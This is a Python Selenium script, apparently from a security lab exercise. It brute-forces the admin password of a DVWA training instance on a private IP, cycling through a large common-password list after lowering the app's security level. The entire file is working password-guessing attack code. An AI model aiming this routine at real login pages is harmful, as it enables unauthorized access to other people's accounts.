from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


def attempt_login(driver, login_addr, usrname, pwd):
    driver.get(login_addr)

    username_inp = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, "username"))
    )
    passw_inp = driver.find_element(By.NAME, "password")

    username_inp.clear()
    passw_inp.clear()

    username_inp.send_keys(usrname)
    passw_inp.send_keys(pwd)
    passw_inp.send_keys(Keys.RETURN)


def set_security_lvl(driver, security_lvl_addr, security_lvl):
    driver.get(security_lvl_addr)
    security_lvls = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.NAME, "security"))
    )
    all_options = security_lvls.find_elements(By.TAG_NAME, "option")
    for option in all_options:
        if option.get_attribute("value") == security_lvl:
            option.click()
            break
    driver.find_element(By.NAME, "seclev_submit").click()


if __name__ == "__main__":
    LOGIN_ADDR = "http://192.168.21.3/dvwa/login.php"
    BRUTE_FORCE_ADDR = "http://192.168.21.3/dvwa/vulnerabilities/brute/"
    SECURITY_LVL_ADDR = "http://192.168.21.3/dvwa/security.php"
    PWDS_LIST_FILE = "./10-million-password-list-top-100000.txt"

    driver = webdriver.Firefox()

    try:
        attempt_login(driver, LOGIN_ADDR, "admin", "password")
        set_security_lvl(driver, SECURITY_LVL_ADDR, "low")
        print("Ctrl + C to stop brute force.")
        while True:
            with open(PWDS_LIST_FILE, "r") as f:
                for pwd in f:
                    attempt_login(driver, BRUTE_FORCE_ADDR, "admin", pwd.strip())
    except KeyboardInterrupt:
        print("Stopping attack.")
    finally:
        driver.quit()
